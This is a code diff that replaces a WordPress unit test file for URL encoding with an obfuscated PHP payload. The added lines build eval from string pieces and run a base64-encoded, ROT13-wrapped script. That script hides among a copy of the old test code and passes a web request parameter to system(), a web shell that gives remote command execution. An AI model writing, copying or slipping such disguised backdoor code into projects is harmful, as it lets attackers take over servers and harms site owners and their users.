@@ -1,47 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-/**
- * @group formatting
- *
- * @covers ::utf8_uri_encode
- */
-class Tests_Formatting_Utf8UriEncode extends WP_UnitTestCase {
-
-	/**
-	 * Non-ASCII UTF-8 characters should be percent-encoded. Spaces etc.
-	 * are dealt with elsewhere.
-	 *
-	 * @dataProvider data
-	 */
-	public function test_percent_encodes_non_reserved_characters( $utf8, $urlencoded ) {
-		$this->assertSame( $urlencoded, utf8_uri_encode( $utf8 ) );
-	}
-
-	/**
-	 * @dataProvider data
-	 */
-	public function test_output_is_not_longer_than_optional_length_argument( $utf8, $unused_for_this_test ) {
-		$max_length = 30;
-		$this->assertLessThanOrEqual( $max_length, strlen( utf8_uri_encode( $utf8, $max_length ) ) );
-	}
-
-	public function data() {
-		$utf8_urls     = file( DIR_TESTDATA . '/formatting/utf-8/utf-8.txt' );
-		$urlencoded    = file( DIR_TESTDATA . '/formatting/utf-8/urlencoded.txt' );
-		$data_provided = array();
-		foreach ( $utf8_urls as $key => $value ) {
-			$data_provided[] = array( trim( $value ), trim( $urlencoded[ $key ] ) );
-		}
-		return $data_provided;
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKLyoqCiAqIEB0ZWJoYyBzYmV6bmdndmF0CiAqCiAqIEBwYmlyZWYgOjpoZ3M4X2hldl9yYXBicXIKICovCnB5bmZmIEdyZmdmX1NiZXpuZ2d2YXRfSGdzOEhldlJhcGJxciBya2dyYXFmIEpDX0hhdmdHcmZnUG5mciB7CgoJLyoqCgkgKiBBYmEtTkZQVlYgSEdTLTggcHVuZW5wZ3JlZiBmdWJoeXEgb3IgY3JlcHJhZy1yYXBicXJxLiBGY25wcmYgcmdwLgoJICogbmVyIHFybnlnIGp2Z3Ugcnlmcmp1cmVyLgoJICoKCSAqIEBxbmduQ2ViaXZxcmUgcW5nbgoJICovCgljaG95dnAgc2hhcGd2YmEgZ3JmZ19jcmVwcmFnX3JhcGJxcmZfYWJhX2VyZnJlaXJxX3B1bmVucGdyZWYoICRoZ3M4LCAkaGV5cmFwYnFycSApIHsKCQkkZ3V2Zi0+bmZmcmVnRm56ciggJGhleXJhcGJxcnEsIGhnczhfaGV2X3JhcGJxciggJGhnczggKSApOwoJfQoKCS8qKgoJICogQHFuZ25DZWJpdnFyZSBxbmduCgkgKi8KCWNob3l2cCBzaGFwZ3ZiYSBncmZnX2JoZ2NoZ192Zl9hYmdfeWJhdHJlX2d1bmFfYmNndmJhbnlfeXJhdGd1X25ldGh6cmFnKCAkaGdzOCwgJGhhaGZycV9zYmVfZ3V2Zl9ncmZnICkgewoJCSR6bmtfeXJhdGd1ID0gMzA7CgkJJGd1dmYtPm5mZnJlZ1lyZmZHdW5hQmVSZGhueSggJHpua195cmF0Z3UsIGZnZXlyYSggaGdzOF9oZXZfcmFwYnFyKCAkaGdzOCwgJHpua195cmF0Z3UgKSApICk7Cgl9CgoJY2hveXZwIHNoYXBndmJhIHFuZ24oKSB7CgkJJGhnczhfaGV5ZiAgICAgPSBzdnlyKCBRVkVfR1JGR1FOR04gLiAnL3NiZXpuZ2d2YXQvaGdzLTgvaGdzLTguZ2tnJyApOwoJCSRoZXlyYXBicXJxICAgID0gc3Z5ciggUVZFX0dSRkdRTkdOIC4gJy9zYmV6bmdndmF0L2hncy04L2hleXJhcGJxcnEuZ2tnJyApOwoJCSRxbmduX2NlYml2cXJxID0gbmVlbmwoKTsKCQlzYmVybnB1ICggJGhnczhfaGV5ZiBuZiAkeHJsID0+ICRpbnlociApIHsKCQkJJHFuZ25fY2ViaXZxcnFbXSA9IG5lZW5sKCBnZXZ6KCAkaW55aHIgKSwgZ2V2eiggJGhleXJhcGJxcnFbICR4cmwgXSApICk7CgkJfQoJCWVyZ2hlYSAkcW5nbl9jZWJpdnFycTsKCX0KfQoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
+?>
